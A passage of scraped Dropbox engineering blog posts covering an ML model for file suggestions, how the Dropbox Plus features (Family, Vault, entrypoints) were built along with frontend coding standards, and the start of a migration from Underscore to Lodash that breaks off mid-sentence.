Stormcrow ), we can start seeing how often they find these suggestions helpful, and use that to help us determine what to do next. We can also compare different variants (e.g., the different heuristics) to see how they perform relative to each other. In our case, we found a number of issues with the heuristics when we first tested them out with users. For example, sometimes a user might have only one file they’ve recently worked on, and nothing else for a long period before that. However, since we were always showing the top three suggestions, users would get confused why the recent file was shown together with their other completely unrelated files. We solved this by thresholding the heuristics: only showing files if their score was higher than a threshold value. We can pick a threshold value by looking at a logged dataset of the suggestions shown, the score for each suggestion, and the ones users clicked on. By setting different threshold values offline, we can make a tradeoff between precision (what fraction of shown results were clicked) and recall (what fraction of clicked results were shown). In our case, we were interested in improving precision, to avoid false positives, and thus picked a fairly high threshold. Any files with heuristic scores below that value wouldn’t be suggested. Another problem we found was that the suggestions sometimes included files that were accessed by programs installed on the user’s computer (such as virus scanners or temporary files) but not through the user’s direct actions. We created a filter to exclude such files in our suggestions. We also found other classes of user behavior we hadn’t included in our initial set of heuristics. In particular, some files were accessed in a periodic fashion which wasn’t captured by our heuristics. These could be documents like quarterly write-ups or monthly meeting documents. At first, we were able to add additional logic to our heuristics to deal with these issues, but as the code started getting more complex, we decided we were ready to start building the first version of the ML model. Machine learning allows us to learn from users’ behavior patterns directly, so we don’t need to maintain an ever-growing list of rules. Machine learning model v1 One way to design an ML system is to work backwards from how we want the system to operate at prediction time. In this case, we wanted a fairly standard prediction pipeline: ML prediction pipeline for the content suggestions system The steps are as follows: Get candidate files : For each user we need a set of candidate files to rank. Since Dropbox users could potentially have thousands or even millions of files, it would be very expensive to rank all of them—and not very useful either, since a lot of files are rarely accessed. Instead, we can limit to the most recent files that the user has interacted with, without a significant loss in accuracy. Fetch signals : For each candidate file, we need to fetch the raw signals we’re interested in related to that file. These include its history (of opens, edits, shares, etc.), which users have worked on the file, and other properties of the file such as its file type and size. We also include signals about the current user and “context” (e.g., current time and device type the user is on), so that the results become more personalized without having to train separate models for each user. The model is trained with activity from a huge number of users, which protects it from bias toward representing the actions (or revealing the behavior) of any given user. For the first version, we only used activity-based signals (such as access history), rather than content-based ones (such as keywords in documents). The advantage of this is that we can treat all files identically, rather than having to compute different kinds of signals depending on file type. In the future, we can add in content-based signals if needed. Encode feature vectors : Since most ML algorithms can only operate on extremely simple forms of inputs, such as a vector of floating-point numbers, we encode the raw signals into what is called a feature vector. There are standard ways of doing this for different kinds of input, which we adapted as necessary. Score : We’re finally ready to do the actual ranking. We pass the feature vector for each file to the ranking algorithm, get back a score per file, and sort by that score. The top-ranked results are then permission-checked again before being shown to the user. Of course, this all has to happen very quickly for each user and their files, since the user is waiting for the page to load. We spent a fair amount of time optimizing different parts of the pipeline. Luckily, we could take advantage of the fact that these steps can be done independently for each candidate file, thus allowing us to parallelize the entire process. In addition, we already had a fast database for getting a list of recent files and their signals (steps 1 and 2). This turned out to be enough to meet our latency budget, without having to significantly optimize steps 3 and 4. Training the model Now that we know how the system will run in production, we need to figure out how to train the model. We initially framed the problem as binary classification: we want to determine whether a given file will be opened now (“positive”) or not (“negative”). We can use the predicted probability of this event as a score to rank results. For the training pipeline, the general guideline is to try to get your training scenario as close to the prediction scenario as possible. Thus, we settled upon the following steps, closely matching our prediction pipeline. Get candidate files : As the input to the entire system, getting this step right is crucial to the final accuracy, and despite its apparent simplicity, it was one of the most challenging, for a number of reasons. Where to get positive examples : Our logging gives us a list of historic file opens. However, which opens should we be counting as our positive examples? The data from the heuristic-powered version of this feature, or general Dropbox file open data? The former are much more “relevant” candidates because we know that the user opened those files in exactly the context we will be deploying this model to; however, models trained only on data from a single context can suffer from tunnel vision when used in a broader context. On the other hand, the more general file history is more representative of all kinds of user behavior, but might include more noise. We initially used the former method as the logs were much easier to process, but switched to a mix of both (with a heavy emphasis on the latter) once we had our training pipeline in place, because the results were much better. Where to get negative examples : In theory, every file in the user’s Dropbox that was not opened is a negative! However, remembering our guideline (“get your training scenario as close to your prediction scenario as possible”), we use the list of recent files, at the time of the positive file open , as the set of possible negatives, because this most closely resembles what will happen at prediction time. Since the list of negatives is going to be much larger than the set of positives—something that ML systems often don’t do well with—we subsample the negatives to only a small factor larger than the positives. Fetch signals : This is just like in the prediction scenario, except it requires access to historic data, because we need the signals as they would have appeared at the time of each training example. To facilitate this, we have a Spark cluster which can operate on historic data. For example, one of our signals is “recency rank,\" which is the rank of a file in the list of recently opened files, sorted by time of last access. For historic data, this means reconstructing what this list would have looked like at a given point in time, so that we can compute the correct rank. Encode features : Again, we keep this exactly as in production. In our iterative training process, we started with very simple encodings of the data, and made them more sophisticated over time as needed. Train : The major decision here was what ML algorithm to use. We started with an extremely simple choice: a linear Support Vector Machine (SVM) . These have the advantage of being extremely fast to train, easy to understand, and come with many mature and optimized implementations. The output of this process is a trained model, which is just a vector containing weight coefficients for each feature dimension (i.e., floats). Over the course of this project, we experimented with many different models: trained on different input data, with different sets of signals, encoded in various ways, and with different classifier training parameters. Note that for this initial version, we trained a single global classifier over all users. With a linear classifier, this is powerful enough to capture generic behavior such as recency and frequency of file usage, but not the ability to adapt to each individual user’s preferences. Later in the post, we’ll describe the next major iteration of our ML system, which can do that better. Metrics and iteration Once we had a working training and prediction pipeline, we had to figure out how to get the best possible system shipped to users. What does “best” actually mean, though? At Dropbox, our ML efforts are product-driven: first and foremost we want to improve the product experience for our users, and any ML we build is in service of that. So when we talk about improving a system, ultimately we want to be able to measure the benefit to our users. We start by defining the product metrics. In the case of content suggestions, the primary goal was engagement. We use several metrics to track this, so we decided to start simple: if our suggestions are helpful, we would expect users to click on them more. This is straightforward to measure, by counting the number of times people clicked on a suggestion divided by the number of times a user was shown suggestions. (This is also called the Click-Through Rate, or CTR.) To achieve statistical significance, we would show subsets of users the suggestions from different models over the course of a week or two and then compare the CTRs for the different variants. In theory, we could launch models every few weeks and slowly improve engagement over time. In practice, we ran into a few major issues (and some minor ones). First was how to attribute increases (or drops) in the CTR due to changes in the product design vs. changes in the ML model. A large body of research and industry case-studies have shown that even seemingly small changes in the user experience (UX) can cause big changes in user behavior (hence the prevalence of A/B testing). So, while one team of engineers was focusing on improving the ML model, another team of engineers, designers, and product managers was focusing on improving the design of the feature. Some high-level examples of this design iteration are shown below: Given that we might change both the UX and the ML model for a new version, how would we know which change affected the CTR (and by how much)? In fact, the problem was even more complicated to address than we initially thought. Early on, we discovered that in a fair number of cases, we were suggesting the right files to the user, but they weren’t clicking them from the suggestions section; instead, they would navigate to the file some other way and open them from there. While there are many possible reasons for this—greater familiarity with existing ways of accessing files, lack of critical contextual information (such as parent folder names, which we added as part of our design iteration), etc.—the end result was that we couldn’t rely on the CTR numbers as our sole measure of model accuracy. We needed to find a proxy metric that would more directly capture the accuracy of our model, and be as independent of UX as possible. There was another compelling reason to switch to a proxy metric: iteration speed. A couple weeks to run an A/B test doesn’t sound very long, but that’s just the time needed for each experiment to run fully. After that, we had to analyze results, come up with a list of proposed improvements, implement them, and finally train the new model. All of this meant that it could take well over a month to release a new version. To make serious progress, we would need to cut this time down dramatically, ideally something that we could measure “offline”—without releasing to users. Hit ratios Our training process let us measure various quantities on held out sets of training data, such as precision and recall (as described earlier), or accuracy of the classifier, but we didn’t find a strong correlation between these metrics and the CTR when we actually launched a model to users. Instead, we came up with a “hit ratio” metric that satisfied all our criteria. For any given suggestion, we checked if the user accessed that file in the subsequent hour, no matter how they arrived at the file. If so, we counted it as a “hit”. We could then compute both a per-suggestion “hit ratio” (percent of suggestions that were hits) and a per-session hit ratio (percent of sessions where at least one suggestion was a hit). We could measure this both online and offline (by looking at historical logs of user behavior). This metric proved invaluable not just for iterating on the ML faster, but also for diagnosing UX issues. For example, when we first moved from displaying content suggestions as a list of files to a set of thumbnails, we expected CTR to increase. Not only were we showing the files in less vertical space, we were also showing thumbnails to make it easier for users to identify the files. However, CTR actually dropped . We tried a few different design iterations and used our hit ratio metric to verify that the quality of the suggestions was not to blame. We discovered a number of issues that we rectified, such as the missing folder names mentioned earlier. Now that we had both a product metric and a proxy metric that measured the accuracy of the model, we could make rapid progress on improving both the UX and ML aspects of our system. However, not all our improvements came solely from looking at those metrics. If you think of metrics as “broad but shallow” measures of our performance, it is also helpful to look at “deep but narrow” measures as a complementary source of information. In this case, that meant looking in some detail at the suggestions for a very small subset of data—those belonging to our own team members. With extensive internal testing, we uncovered a number of other issues, including many that affected the very beginning of the pipeline: what data we used. Here are a few interesting examples: Short clicks : We found that our training data included instances where users would open a file in a folder, and then scroll through other files in that folder using the left and right arrow keys. All of these would end up getting counted as positive training samples, even though this kind of behavior isn’t applicable on the home page, where we only show a few images at a time. We thus devised a simple method of labeling these “short clicks” and filtered them out from our training data. Very recent file activity : A commonly used Dropbox feature is automatically saving screenshots to Dropbox . Users coming to the home page would expect to see these right away, but our feature pipeline wasn’t quite responsive enough to pick these up. By tuning the latency of various components, we were able to include these in the results as well. Newly created folders : In a similar vein, users expect to see newly created folders show up on the home page, since these are often created specifically to move files into. In this case, we had to temporarily use a heuristic to detect such folders and merge them into the suggestions, since the kind of signals we have for folders is much more limited (and different from files). Machine learning model v2 Armed with this newly gleaned knowledge of where our current system wasn’t doing as well, we set out to make significant improvements throughout the training pipeline. We filtered out short clicks from our training data, as well as certain other classes of files that were getting spuriously suggested to users. We started integrating other kinds of signals into the training process that could help move our hit ratio metric. We reworked our feature encoding step to more efficiently pull out the relevant information from our raw signals. Another big area of ML investment at Dropbox proved to be quite important for improving the content suggestions: learning embeddings for common types of entities. Embeddings are a way to represent a discrete sets of objects—say each Dropbox user or file—as a compact vector of floating point numbers. These can be treated as vectors in a high-dimensional space, where commonly used distance measures such as cosine or Euclidean distance capture the semantic similarity of the objects. For example, we would expect the embeddings for users with similar behavior, or files with similar activity patterns, to be “close” in the embedding space. These embeddings can be learned from the various signals we have at Dropbox, and then applied as inputs to any ML system. For content suggestions, these embeddings provide a noticeable boost in accuracy. Finally, we upgraded our classifier to a neural network . Our network is currently not very deep, but just by being able to operate non-linearly on combinations of input features, it has a huge advantage over linear classifiers. For example, if some users tend to open PDF files on their phones in the morning, and PowerPoint files on desktop in the afternoon, that would be quite hard to capture with a linear model (without extensive feature combinations or augmentations), but can be easily picked up by neural nets. We also changed how we framed our training problem slightly. Instead of binary classification, we switched to a Learning-To-Rank (LTR) formulation. This class of methods is better suited to our problem scenario. Rather than optimizing for whether a file will be clicked or not, completely independent of other predictions, LTR optimizes for ranking clicked files higher than not-clicked files. This has the effect of redistributing output scores in a way that improves the final results. With all of these improvements, we were able to significantly boost our hit ratio and improve overall CTR. We have also laid the groundwork for additional improvements in the future. Acknowledgements This project was a highly collaborative cross-team effort between the product, infrastructure, and machine learning teams. While there are too many people to list here individually, we’d like to give special credit to Ian Baker for building large parts of the system (as well as improving virtually every other piece in the pipeline), and to Ermo Wei for leading much of the ML iteration effort. All of our teams are currently hiring, so if these kind of problems sound exciting to you, we’d love to have you join us ! // Tags Machine Learning Machine Intelligence Neural Networks Heuristics Ranking // Copy link Link copied Link copied", "date": "2019-05-02"},
{"website": "Dropbox", "title": "The software engineering lifecycle: How we built the new Dropbox Plus", "author": ["Matthew Gerstman"], "link": "https://dropbox.tech/frontend/the-software-engineering-lifecycle--how-we-built-the-new-dropbox", "abstract": "Problem Scoping Family Joining Vault Shipping Our Team Coding Standards Entrypoints Launch Appendix A: Family Plan Milestones Appendix B: Vault Frontend - Refactoring in the Right Direction A few weeks ago, we released a whole bunch of new features to Dropbox Plus, our paid plan for personal users. While we started as a storage company, we‘ve grown to be a hub to manage your digital life. About 150 people worked on this launch: engineers, product managers, designers, copywriters, and many more. Through a combination of luck and happenstance, I was fortunate enough to touch almost every part of this launch. I got to see how different teams work, as I joined each at different stages of the software engineering lifecycle. In this post I’ll distill my experience working on different parts of the launch, and discuss how we think about building software. I’ll go into a few technical details, but mostly focus on how teams organize and operate. Problem Scoping Toward the end of 2019 we had a realization: while we had built incredible new products for our professional users like the new Dropbox and Dropbox Transfer , it had been a while since we delivered new value to our personal users. We set out to change that. We put together a team focused exclusively on helping personal users manage their digital lives. At the time we didn’t know how much those lives and needs would change the year to come, but in hindsight our timing was great. Our contract with our customers is simple: We build products that people like so much that millions of them pay for it. As a rule, we aspire to be worthy of trust in all situations. You are our customer, not our product. Merging our mission and our values, we came up with a simple plan: ship a bunch of timely, useful features to our most loyal users. After a lot of discussion about what to build, we came up with the new Dropbox Plus. We knew our users wanted computer backup . This was finally possible thanks to our brand new sync engine , which we had just finished rolling out in June. We did weeks of customer research and learned that users wanted a handful of specific new features from us. They wanted a special folder where they could store their most important files, this became Dropbox Vault . Our research also surfaced that most of our users still weren’t using a password manager. We knew this would be fundamental to their digital security, so we acquired Valt and integrated their product into the Dropbox product suite to fulfill our user’s needs. The irony wasn’t lost upon us that we were building a secure folder called Vault while acquiring a company called Valt. Finally, users expressed a desire to share their Dropbox plan with their family, without sharing their account. So we came up with the Dropbox Family plan . Family I started 2020 as a member of the Family team. Our mission was to build a new paid plan for users that let them share all of our new and existing features with family members under one subscription, as they do with other subscriptions at home. This team was brand new, formed while the product spec was still in progress. We hadn’t written any code yet. There were a lot of questions we had to answer first: Do users want one family folder or a shared quota? How many people can be in a family? What makes a family different from a workplace “team”? Plan Before Coding We also put a lot of time into architecture decisions before we began implementation, to design a product that would both fit today’s needs and accommodate future growth. When starting out on a new project it’s important to lay out a rough plan, even though you know those plans will shift later as you learn more and as theory meets practice. What should our data model look like? How do we want to compose APIs? How do we integrate with our existing payments system? Planning ahead kept us from wasting developer cycles once we started coding. Team Dynamics Early on, we realized we shouldn’t build this product on the existing Dropbox for Teams infrastructure. Our existing teams model is built for professional use cases and involves lots of advanced sharing, permissions, and user management features that family users wouldn’t need. It would have slowed us down to retrofit this system for family plans, and in some cases would force abstractions that would be anathema to families. For example, a team admin can access any team member’s files—something many families wouldn’t want. As we were hammering down the exact requirements, we started planning technical infrastructure for the project. This was in January while we were still working in physical offices. All of the engineers on the core Family team were in the New York office. Each member of the engineering team brought a different set of expertise to the table. I was personally tasked with leading frontend architecture. My job was to figure out how to build all of the Family management and invite pages. Others focused on APIs, data model, or handling shared quota. We sat together in a pod, constantly bouncing ideas off of one another. Because this was a greenfield project, rather than extending existing architecture, we were able to design the data model, API, and user interface each with the others in mind. The team were often at each others desks, discussing how we might model the problems we were solving. With all-day proximity, everyone had enough context on everything. Speeding Up Development I’m especially proud that we decided to build all of our pages as independent applications. For example, we knew the Family management page was likely to end up as part of Account Settings, but we didn’t want to be encumbered by that development process. Building on the already established page Account Settings page directly would have slowed us down. Here’s why: To test on the Account page we’d have to create a Plus user, navigate to the Account page, and invite members to the Family before we could start testing the existing core features on the page. This meant a 2-3 minute edit/refresh cycle, totally unacceptable in our rapid iteration phase. We needed to be able to test things in seconds, as we were still figuring out the exact experience we would be offering. Instead, we spun up a developer sandbox with a set of test fixtures. We embedded the root Family management component at the top. This allowed us to test the Family settings page in isolation and only worry about the parts actively in development. As part of this we invested in a new internal technology called API-QL. We use an in-house interface description language to build REST endpoints for our APIs. This provides convenient features like client/server type validation, but doesn’t provide caching, polling, or React hooks. A pollo , a popular GraphQL client, provides all of these things and would allow us to experiment with GraphQL without changing our serving stack. API-QL is a layer between Apollo and these rest endpoints. It is built on top of Apollo’s local resolvers and implements a lightweight GraphQL server in the client. API-QL allowed us to build our REST endpoints, but still leverage the caching and other developer experience wins provided by Apollo. Armed with API-QL and a culture of collaboration, all of our APIs were designed with API-QL in mind. Milestones For each new feature we set up a series of milestones for the project. In the case of Family plans, we were focused on the following: internal alpha, external alpha, beta, and finally GA (general availability). I was on the team through internal alpha so we’ll cover that here. Appendix A contains a list of all of the remaining milestones and their goals. Internal Alpha: Dogfooding The goal of the internal alpha was to ship something to other Dropboxers so we could dogfood the feature. We strive to do this for every feature, so we can test the basic functionality and make sure all the plumbing works. This helps us build confidence in product quality before shipping to any external users. We were determined to be constantly shipping value to users, whether those users be Dropbox employees, friends and family, or curious beta testers. To reach that first internal alpha we constantly cut scope. Our goal was to ship a minimal viable product for amily plans as quickly as possible for our internal alpha, without including anything that might cause them trouble. It needed to work end to end. It didn’t need to be polished. So any time a modal appeared that said “are you sure you want to do this?” we rescheduled that specific functionality for a later milestone. We also held off on nice-to-have features like contact suggestion or email reminders. These features would be necessary for a finished product, but would slow us down and weren’t unique to the new Family plan, which is what we wanted our alpha users to test. Onboarding a new teammate Midway through the quarter we had a very experienced frontend engineer join Dropbox and the Family team. As frontend lead, it was my responsibility to come up with a well scoped project that would help them learn our stack. Our milestone-based planning was really helpful here. We had already decided that we needed contact suggestion for the final product, but had not made it part of the internal alpha since we could get away with a simple text field. This made for a perfect starter project: It touched every layer of our stack, but wasn’t necessary until a later milestone. Our new hire could immerse themselves in our stack without feeling they were holding up the rest of us. As they ramped up, it became clear he could take over frontend for Family plans from me. This was timely, because another product outside of Family needed some attention. Joining Vault During the first week of March, my manager and I discussed in our weekly one-on-one that the Vault team needed someone to come in and set frontend technical direction. The team’s mission was to build a secure folder for users’ most important documents. The majority of their efforts had been focused on making that folder as secure as possible. They had built a minimal viable product in under nine weeks. Now we needed to shape it into a stable foundation. We set a transition plan for me to hand off all of my work on Family the last week of March, while it was in alpha, and begin ramping up on Vault the first week of April. Class Dismissed Shortly after, 2020 hit. On March 13, Dropbox announced we’d all be working from home due to COVID-19. At the time we thought it would just be a few weeks; how naive we all were. Before I knew it, my time on the Family team was over and we were still at home. I had to figure out how to onboard onto a new team in the middle of a pandemic. The very first thing I did was set up a 1:1 with each and every person with whom I’d be working. We had engineers working on locking/unlocking the folder, serving APIs, updating the desktop app, and working on the existing frontend. We also had a product manager and a designer. I knew it was important to establish these relationships early on if I were to become an effective member of the team. We held these 1:1s over Zoom as soon as the company had sent us all to work from home, rather than waiting until April. It was a shift for everyone but it worked. Over time I figured out who I’d be working with the most. I set up weekly 1:1s with them to make sure we stayed in sync from afar. After a few weeks on the team I wrapped up my own starter project—updating user onboarding—and began to focus on codebase quality. I began to tackle my mandate of setting technical direction on the frontend. Our existing frontend code was hard to test. It had a lot more spaghetti than we’d like because it had been built so quickly. We wanted to migrate to a stronger foundation, without slowing down team progress. To accomplish this, I began a doc called Vault Frontend: Refactoring in the Right Direction. An abridged version of this doc is available at the bottom of this post in Appendix B. Shipping Our Team Coding Standards Defining a solid set of standards for the team’s code was one thing. But in order to ship these standards in a product, I needed to get buy-in from the rest of the team. I shared the first draft with the two other frontend engineers on the team. The three of us then jammed on it until we were all satisfied with its specs. Besides making it clear what the team should do, we had to make it clear why . Of course, it’s more fun to write code following the latest best practice. But there are important business wins as well that the team should understand. Higher quality code is easier to read, easier to update, and easier to maintain. Our measurable goal was to reduce the number of bugs coming in on any given week. The three of us presented this doc to the team and everyone was on board with it. Over time, we were increasingly happy with the state of our codebase. However, we noticed that one of the decisions we’d made was slowing us down. Nothing’s Perfect At my recommendation, the team had begun using API-QL for API calls. While it boosted the Family team’s output, for the Vault team it turned out to be a mistake. The Family team operated in a greenfield codebase and built APIs with API-QL in mind, on Vault we were retrofitting API-QL onto existing APIs. The data models didn’t line up, which slowed down development on the Trusted Contact feature. There was an important lesson here: Ideas that work flawlessly on one project might not transfer to another. API-QL is a fantastic technology and we’re continuing to invest in it, but it wasn’t the right fit for this project at this time. Reflecting Overall, our standards doc provided a solid foundation for our code going forward. While API-QL wasn’t the right fit, we were able to amend the doc and continue refactoring in the right direction. This reduced the number of incoming bugs, made our code more delightful to work with, and overall sped up developer velocity. Most important, it put us all on the same page. Not only the doc, but the process of co-authoring it helped us define what good code looks like to us. This made code review faster and more consistent, since we all had a shared frame of reference. Entrypoints As I was wrapping up frontend technical direction for Vault, I was pulled into a related project: entrypoints for new features. It’s not enough that features like Vault, Passwords, and Computer Backup exist. Users need to be given ways to find them. We can’t expect them to go looking. We need to meet them where they are. This might sound simple, but it was a large collaborative effort involving product, platform, and infra teams. Our job was to dive into all of those other teams’ codebases and integrate our new features with their existing source. We already had two engineers working on this full time, but one of them was imminently going on paternity leave. I had joined this project to take over the frontend work. We had about two weeks of transition where all three of us worked together. Then it was just the two of us—me and Michael. I was in charge of frontend, he did backend. This job presented its own challenges. On Family we had started from scratch, but on Vault I joined a product in motion. Now, to present users with entrypoints we needed to make a ton of tiny changes all over the codebase. Yet while Family and Vault were teams of about 10 developers each, entrypoints was just Michael and me. For two months we cranked out tickets, integrating our new features with Dropbox’s existing surfaces. We had to dive into everything from the web UI to the sync engine. Unlike Family or Vault which needed to focus on architecture or code quality, we were touching code we didn’t own, and our focus was flat-out “get it done.” On one particularly exciting occasion we paired for half a day with an engineer on the sync team. We needed to show a warning when a user deleted one of their file system entrypoints. Neither me or Michael were familiar with Rust , the language used for the sync engine, so we needed to bring in expertise for a day. It sounds stressful, but the experience was a blast. Pair programming in a language you don’t know feels like having superpowers. I was also happy I could claim that I’d touched our new backup feature, even if I only added a few lines of code. We got this change into the client just under the wire, then waited with bated breath as it went out to users. Launch Before we knew it, our new and improved Dropbox Plus began going to market. This process involved rolling out the features to a subset of our users over time. We have an internal gating technology called Stormcrow that allows us to set a percent of the population we want to receive a feature. We turned on all of our new features to 1% of our users, then 10%, then 25%, then 50%, then 100%. I wish I could say this went off without a hitch, but it didn’t. We realized after sending out our announcement email that so many users were trying to sign up for Plus at once that our payments system couldn’t keep up. We rolled back the features, fixed the payments system, then turned the features back on. After fixing this and tweaking our email cadence to keep traffic in mind, the features were live for everyone. Within just a few weeks, millions of users had tried out our new features. Appendix A: Family Plan Milestones For each new feature we set up a series of milestones for the project. In the case of Family plans, we were focused on the following: internal alpha, external alpha, beta, and finally GA (general availability). Internal Alpha: Plumbing Internal alpha was our first milestone, the goal here was to “test the plumbing.” We wanted Dropboxers to upgrade, invite family members, and test our surfaces. This milestone allowed us to test with real users in production, even if they were all Dropboxers and their families. More details above. External Alpha: Early Feedback External alpha was about gaining data from a larger, more diverse group of real users to inform and sharpen our decisions about the product. This meant going outside the circle of Dropboxers and their families. We wanted to see how often users upgraded, how many members they added to their families, and gather general feedback from the outside world. Beta: Public QA While external alpha is about collecting signals to help finalize product decisions, beta is about ensuring stability in that final product that we’ve defined and built. Our goal in beta is to remove as many unknown unknowns as possible and figure out what bugs real users are running into. General Availability: Stable Finally, GA is when we remove the beta tag and release a complete product to all of our users. At this point we’re confident in both the product decisions we’ve made and the quality of the software itself. Appendix B: Vault Frontend - Refactoring in the Right Direction Guidelines for refactoring As we work on Vault frontend, we should be refactoring our code in the right direction. All future diffs should aim to correct preexisting code that breaks these rules. Don’t block progress Our team’s mission is to ship a product for storing your most sensitive files. A maintainable codebase is the means to that end, not a goal in it of itself. Try to keep it on a per file basis It’s easy to rabbit hole when refactoring a file. Try to keep it to one refactored file (and its tests) per diff. Maintain the interface in the first diff First refactor the internals of the component, then change its props in a followup. Write new tests Many of our current tests are ineffective, write new tests based on the guidelines below when you change a component. Focus on the customer and shipping features first, as opposed to focusing on clean code for the sake of clean code. Components All UI components should live in the component library. A good rule of thumb is if it imports from our design system it belongs in the team level component library. Function components over class components Hooks are now considered standard best practice, we should work to refactor class components into function components with hooks. i18n belongs at the bottom of the file Create a function called getStrings or a hook called useStrings to return strings needed for a component. Don’t inline i18n in components. Declarative, not Imperative Avoid functions like Modal.showInstance. Keep track of the open/close state for a modal. Design System Styling Avoid overriding styles within design system components.  Where possible, reach out to Design Systems to find supported configuration options. Testing All tests should be written with react-testing-library. This library is geared towards functional testing rather than tests around dom output. Don’t use enzyme Enzyme is semi-deprecated and has poor support for hooks Avoid Duplicating Test Coverage If a component is effectively tested by the tests of its subcomponents, don’t reimplement those tests. For example testing that a modal opens/closes when it uses the underlying DIG modal Never use a className for anything other than css Use data-testid to get components. Do not use classNames or or text inside a component State Management Note: we ended up reverting these decisions regarding state management. See the above section Shipping Our Team’s Coding Standards for more details. Avoid Redux For API State API integration should be done through API-QL, a setup diff will be coming Consider removing Redux entirely Put component or UI state in either context or a hook. Logging Put logs at the bottom of the file There are just so. many. logging. statements. We put i18n and logging at the bottom of the file so we can reduce noise while reading business logic. Instead of this Copy const onInviteModalSend = () => {\r\n    logProductAnalyticsEvent({\r\n      eventAction: AnalyticsEventAction.SELECT,\r\n      eventObject: AnalyticsEventObject.SEND_CONTACT,\r\n      actionSurface: AnalyticsEventActionSurface.VAULT_SETTINGS,\r\n    });\r\n    closeModal();\r\n  }; Do this Copy const onInviteModalSend = () => {\r\n  loggingFuncs.logInviteModalSend();\r\n  closeModal();\r\n};\r\n\r\nconst loggingFuncs = {\r\n  logInviteModalSend: () => {\r\n    logProductAnalyticsEvent({\r\n      eventAction: AnalyticsEventAction.SELECT,\r\n      eventObject: AnalyticsEventObject.SEND_CONTACT,\r\n      actionSurface: AnalyticsEventActionSurface.VAULT_SETTINGS,\r\n    });\r\n  }\r\n} In Tests Copy import loggingFuncs from 'component-file';\r\nspyOn(loggingFuncs, 'logButtonClicked') Code Isolation - Future proofing for code sharing Avoid importing from elsewhere in the server repo. If you need to import something from outside of modules/clean/react/vault or the vault component library look into dependency injection. We will likely handle these on a case by case basis. We will likely use React context to handle these. Styling Avoid advanced SCSS Make your classnames easy to grep for. Do This Copy .vault-link {\r\n  // styles\r\n}\r\n.vault-link:hover {\r\n}\r\n.vault-link-bold {\r\n} Don’t do this These classes are hard to map back to components from code. Copy .vault-link {\r\n  // styles\r\n  &-bold {\r\n  }\r\n  &:hover {\r\n  }\r\n} // Tags Front End JavaScript GraphQL TypeScript React Apollo // Copy link Link copied Link copied", "date": "2020-09-15"},
{"website": "Dropbox", "title": "Migrating from Underscore to Lodash", "author": ["Matthew Gerstman"], "link": "https://dropbox.tech/frontend/migrating-from-underscore-to-lodash", "abstract": "Why migrate? Setting a strategy for migration Migrating the Codebase Conclusion The core Dropbox web application is 10 years old and used by millions of users per day. Hundreds of front-end engineers across multiple cities actively work on it. Unsurprisingly, our codebase is very large and somewhat irregular. Recently written parts have thorough test coverage, other parts haven't been updated in years. Over the past two years we've worked to modernize our front-end stack. We've successfully moved from CoffeeScript to TypeScript, from jQuery to React, and from a custom Flux implementation to Redux. Having completed these migrations we identified our utility library, Underscore, as one more candidate for migration. Why migrate? When we began our research, Underscore hadn't seen an update in 3 years. Newer developers were hesitant to use a deprecated library. We wanted to fill that need. Benefits of Lodash Lodash is a utility library composed of many individual modules. It can be used as a complete library, as individual modules, or as a custom build consisting of just the necessary functions. It's the single most used utility library on the web , and as a result is extremely battle tested. It heavily optimizes for front-end CPU performance in a way that Underscore doesn't. For example, Lodash is implemented to take advantage of JIT in JavaScript engines . It also offers new features that promote functional programming. For example, it's well suited for building a functional selector layer between React and Redux, two technologies we use in our front-end codebase. Finally, Lodash is actively maintained, which is critical to long-term support of the library. Setting a strategy for migration We wanted to use a strategic migration approach. By gathering consensus from our internal community, doing research first, and constructing a bespoke build for our environment before migrating our entire codebase, we hoped to avoid serious problems. Getting alignment with a Web Enhancement Proposal At Dropbox, we use a lightweight, but formal proposal process to align on technology changes. Web Enhancement Proposals (WEPs) are based on Python's PEPs. They let developers debate the pros and cons of universal changes and reach consensus before making codebase changes that will affect many developers and users. Given the size of our codebase and the number of users that could be affected, creating a WEP for the migration was a natural first step. We identified the goal of creating a minimized, custom Lodash bundle that we can heavily cache and use throughout our primary web application, deprecating support for Underscore.js and migrating all currently used instances to Lodash. Over 100 engineers interacted with the document. We addressed concerns from front-end teams without too much heavy bureaucracy. Doing the research first Because we wanted a custom Lodash build with just the necessary functions, we needed to create a list of those functions. We looked at how Underscore was being used in our codebase. We also looked at cases where Javascript has evolved enough to permit using native solutions. Using this data we put together a list of Lodash functions we should use. It wasn't exhaustive but it got us 90% of the way there. We also needed to get Lodash playing nicely with our toolchain. We use Bazel—an open-source, extensible, scalable build tool—to coordinate our entire build process. Static typing is enforced with TypeScript. Bazel optimizes for a deterministic build process, but doesn't have any built-in support for tree shaking JavaScript. For the unfamiliar, tree shaking is a process by which unused code is eliminated from a bundle. Choosing the right tools We needed to pick the right tool to produce a custom Lodash build with our chosen set of functionality and an accurate subset of TypeScript types. Initially we expected the lodash-cli to provide the support we need. Unfortunately, lodash-cli doesn't have any notion of types, does a poor job of tree shaking, and is being deprecated with Lodash 5.0.0 in favor of bundling with Webpack. Next we tried Rollup and Webpack, two popular JavaScript build/bundling tools. We were specifically interested in plugins that would allow us to minimize our bundle size as much as possible. The lodash-webpack-plugin and lodash- ts-imports-loader are both important for reducing bundle size. Webpack was the clear winner; it has much better plugin support for what we were building. Building the bundle Our first attempt was a single build that produced a pre-minified Lodash library and a TypeScript typings file. We had configured Webpack to produce an index.ts file that imported the Lodash functions we wanted and then reexported them for consumption by our web app. With that config we were able to produce a bundle size we were happy with(12k). However we quickly noticed that the generated typings file wasn't going to play nicely with our actual codebase. We had assumed the build would produce a single lodash.d.ts file containing all of the types we needed within the file. This assumption was false. Instead, the build created a file that imported functions from individual modules and reexported them. It didn't encapsulate everything under a single Lodash package so much as output a series of unlinked functions. The lodash-ts-imports-loader plugin converts from the input to the output formats below: Input Copy import {after, get} from 'lodash'; Output Copy import after from 'lodash/after';\nimport get from 'lodash/get'; This is great for treeshaking, but not so great for typing. While it produced a small javascript bundle, the types file attempted to import from individual Lodash modules. This didn't work for us because developers needed to import from a single Lodash module. We wanted this both for developer experience and so we could serve it separately and trust browsers to cache it. The solution was splitting our build into a two-stage process. The first build created a typings file as though we weren't doing any module splitting/tree shaking. The second build produced a properly treeshaken bundle. From this build we got a minified Lodash bundle and a typings file that looked like this: Copy import {after, ...} from 'lodash-full';\nexport {after, ...}; This build had a minor tradeoff in that we needed to check in a full version of the Lodash typings called lodash-full.d.ts. This allowed our developers to import * as lodash from 'lodash'; and not worry about how it was built. It also provided a firewall of sorts, and caused a TypeError if a user attempted to use a Lodash function we didn't include in our bundle. Integrating With Bazel: As soon as Webpack produced a working Lodash bundle and typings file, we turned to integrating Webpack with 